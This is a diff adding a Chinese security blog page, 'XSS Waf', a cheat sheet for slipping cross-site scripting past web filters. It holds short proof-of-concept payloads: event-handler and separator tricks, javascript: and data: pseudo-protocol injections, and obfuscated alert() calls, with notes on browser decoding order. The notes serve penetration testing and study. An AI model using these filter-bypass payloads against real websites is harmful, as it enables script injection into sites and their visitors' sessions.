@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  XSS Waf &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="Cross Site Script|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="XSS Waf | 春田花花幼稚园">
+    <meta name="twitter:description" content="Cross Site Script|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>主页</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">XSS Waf</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/web%E6%B8%97%E9%80%8F' class="muted-link">
+  <span class="Label Label--gray-darker">WEB渗透</span>
+</a>
+
+
+
+<a href='/tags/xss' class="muted-link">
+  <span class="Label Label--gray">XSS</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-26. Published at: 2020-02-25.">
+        
+          Lastmod: 2020-02-26
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>XSS Waf 常见的绕过手段</p>
+<h2 id="四种情况">四种情况</h2>
+<p><strong>另起炉灶</strong> <code>&lt;div id = &quot;body&quot;&gt;&quot;“output”&quot;&lt;/div&gt;</code></p>
+<p>尖括号没有遇到像<code>htmlspecialchars()</code>的转义，大摇大摆。</p>
+<blockquote>
+<p>htmlspecialchars ( 转换<code>&amp;</code> 、 双引号<code>&quot;</code> 、尖括号<code>&gt;</code> <code>&lt;</code>为实体编码)，默认不转义单引号</p>
+</blockquote>
+<p>​</p>
+<p><strong>逃离引号</strong> <code>&lt;input type=&quot;text&quot; value=&quot;“output”&quot;&gt;&lt;/input&gt;</code></p>
+<ul>
+<li>逃出双引号，利用<strong>标签自带事件</strong>执行JS</li>
+<li>亦可以另起炉灶，闭合标签，新建标签，再注释结尾</li>
+</ul>
+<p>​</p>
+<p><strong>活在体制</strong> <code>&lt;script&gt;a=“output”;&lt;/ script&gt;</code></p>
+<p>高成功率，对其进行JS进制编码、实体编码，加强隐匿效果（参见解码顺序）</p>
+<p>​</p>
+<p><strong>内在CSS</strong> <code>&lt; style&gt;body{font-size:“output”px;}&lt;/ style&gt;</code></p>
+<p>​</p>
+<h2 id="测试流程">测试流程</h2>
+<ol>
+<li>
+<p>插入特殊符号/正常标签 =》确认输出点位置/类型</p>
+</li>
+<li>
+<p>插入高危payload =》获得过滤情况 =》测试某些事件</p>
+</li>
+</ol>
+<h2 id="分隔符">分隔符</h2>
+<p>浏览器特性，补全双引号 <code>onerror=alert('xss')</code></p>
+<p>替代空格的分隔符，<code>$#x0a;</code>、 <code>$#x0d;</code>、<code>/</code> 、反引号/重音符</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">details</span><span class="err">/</span><span class="na">ontoggle</span><span class="o">=</span><span class="s">alert(1)</span><span class="p"></span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">x%0donerror=%0aalert(/xss/)</span><span class="p"></span><span class="p">&gt;</span>
+</code></pre></div><p>​</p>
+<h2 id="伪协议">伪协议</h2>
+<p><strong>JavaScript伪协议</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:alert(2)&#34;</span><span class="p"></span><span class="p">&gt;</span>Dangerous<span class="p">&lt;</span><span class="p">/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div><p><strong>data伪协议</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span>
+<span class="s">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgnYScpPC9zY3JpcHQ+&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">object</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;data:text/html,&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></div><p>​</p>
+<h2 id="编码绕过">编码绕过</h2>
+<p>实体编码、进制编码、URL编码</p>
+<p><a href="https://www.freebuf.com/articles/web/10121.html">XSS解决方案系列之二：知其所以然—浏览器是如是解码的</a>：</p>
+<blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p"></span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p"></span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p"></span><span class="p">&gt;</span>jiayzhan&#39;s item<span class="p">&lt;</span><span class="p">/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">a</span> <span class="na">ID</span><span class="o">=</span><span class="s">&#34;jiayzhan&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;alert(&#39;jiayzhan\&#39;s onclick&#39;)&#34;</span>
+   <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://www.jiayzhan.org&#34;</span> <span class="err">&#34;</span><span class="p"></span><span class="p">&gt;</span>jiayzhan&#39;s link<span class="p">&lt;</span><span class="p">/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="p">/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p"></span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;jiayzhan&#39;s URL&#34;</span><span class="p">)</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="p">/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div><p>​	带有字符串【jiayzhan】的一整串，您需要将它们理解为类似于这样的JSP代码：<code>&lt;%=request.getParameter(&quot;jiayzhan&quot;);%&gt;</code></p>
+<p>​	下面一步一步来说浏览器是如何解码(反转义)的，我就用字符串本身作为位置标识来解释：</p>
+<p>​	1. 位置：<code>jiayzhan's item</code>, 浏览器在解析这个位置的字符串时，无论如何，会对其进行一次HTML解码</p>
+<p>​	2. 位置：<code>jiayzhan\'s onclick</code>，无论如何，浏览器会对其进行：1） 先做HTML解码 2）再做JS解码</p>
+<p>​	3. 位置: <code>http://www.jiayzhan.org</code>，无论如何，浏览器会对其进行：URL解码</p>
+<p>​	4. 位置：<code>jiayzhan’s URL</code>， 无论如何，浏览器会对此位置字符串进行：1）先JavaScript解码 (JS编解码请<a href="http://www.w3schools.com/js/js_obj_string.asp">参考</a>）  2）后URL解码</p>
+</blockquote>
+<p>​</p>
+<p><strong>！！！灵活运用不同标签解码特性，增加编码混淆，绕过过滤器！！！</strong></p>
+<p>​</p>
+<h2 id="混淆编码">混淆编码</h2>
+<p><code> alert()</code>混淆</p>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="p">(</span><span class="nx">alert</span><span class="p">)</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">a</span><span class="o">=</span><span class="nx">alert</span><span class="p">,</span><span class="nx">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">alert</span><span class="p">)</span>
+<span class="nx">top</span><span class="p">[</span><span class="s2">&#34;al&#34;</span><span class="o">+</span><span class="s2">&#34;ert&#34;</span><span class="p">]</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">top</span><span class="p">[</span><span class="sr">/al/</span><span class="p">.</span><span class="nx">source</span><span class="o">+</span><span class="sr">/ert/</span><span class="p">.</span><span class="nx">source</span><span class="p">]</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">al\u0065rt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">top</span><span class="p">[</span><span class="s1">&#39;al\145rt&#39;</span><span class="p">]</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">top</span><span class="p">[</span><span class="s1">&#39;al\x65rt&#39;</span><span class="p">]</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nx">top</span><span class="p">[</span><span class="mf">8680439.</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span><span class="p">]</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>jsfuck、aaencode、颜文字、jjencode</p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>XSS Waf</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#四种情况">四种情况</a></li>
+    <li><a href="#测试流程">测试流程</a></li>
+    <li><a href="#分隔符">分隔符</a></li>
+    <li><a href="#伪协议">伪协议</a></li>
+    <li><a href="#编码绕过">编码绕过</a></li>
+    <li><a href="#混淆编码">混淆编码</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
